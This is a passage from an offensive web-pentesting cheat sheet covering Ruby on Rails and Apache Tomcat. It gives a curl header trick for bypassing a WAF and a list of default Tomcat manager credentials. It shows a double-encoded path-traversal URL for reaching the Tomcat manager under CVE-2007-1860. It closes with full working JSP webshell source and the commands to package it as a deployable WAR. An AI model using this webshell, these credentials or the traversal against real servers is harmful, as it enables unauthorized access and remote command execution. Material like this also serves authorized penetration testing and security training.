- X-Content-Type-Options: nosniff
- X-Frame-Options: SAMEORIGIN
- Content-Security-Policy: default-src 'self'

### 6) Ruby
#### Ruby on Rails
- Data may be hidden in html, but can be viewed in another format like JSON in modern frameworks
- #1 HTML: http://example.com/users/1 
- #2 JSON: http://example.com/users/1.json
- #2 JS: http://example.com/users/1.js
- Bypass WAF with modifed Header: `curl https://example.com/users/1 -H 'accept:application/json'`

#### Mass Assignment
- Introduction on [code.tutsplus.com](https://code.tutsplus.com/tutorials/mass-assignment-rails-and-you--net-31695)
- Developers can use ActiveRecord (Ruby-on-Rails' most common data mapper)
- Then, class Organisation can have multiple user's
- Then, the relation is managed using a field organisation_id inside the User class
```
class User < ActiveRecord::Base
  belongs_to :organisation
end

class Organisation < ActiveRecord::Base
  has_many :users
end
```

### 7) APACHE TOMCAT
## Info
- Apache Tomcat is used to deploy Java Servlets and JSPs (Java Server Pages)
- One can build WAR (Web ARchive) files, and drop it in the deploy directory in Tomcat
- Basically, Apache is an HTTP Server, serving HTTP vs. Tomcat is a Servlet and JSP Server serving Java technologies
- **Tomcat 9**:
	- Access to the Manager is disabled by default
	- In addition to that, there is no default username and password
	- You must create a new username/password combination and associate it with the manager-gui role
	- To do this, you’ll need to modify the **$CATALINA_BASE/conf/tomcat-users.xml** file
- **Tomcat Roles**:
   - manager-gui: Access to the Manager interface through the browser. The web interface comes with CSRF protection
   - manager-status: Server Status page access only
   - manager-script: Like manager-gui but using the text interface instead of the HTML GUI. Used by admins to write scripts for automation
   - manager-jmx: JMX proxy access for monitoring
- Older Tomcat Versions may have default credentials:
   - Usernames: tomcat, admin, manager, user
   - Passwords: admin, tomcat, password, "empty"
- Older Tomcat Versions may be vulnerable to **CVE-2007-1860**
   - Vulnerable module: **mod_jk**
   - Use Double Encoding to get to manager-GUI: `example.com/examples/jsp/%252e%252e/%252e%252e/manager/html/`
	- If CSRF protection is in place than you need valid session cookie: `Cookie: JSESSIONID=189D63B9BBBBBBB0DF29CFF84135F2; Path=/manager/; HttpOnly`
- Example JSP Webshell
```
$ sudo apt install fastjar (for jar-packaging capability)
$ mkdir webshell
$ cp index.jsp webshell
$ cd webshell
$ jar -cvf ../webshell.war *

#index.jsp:

<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>
```
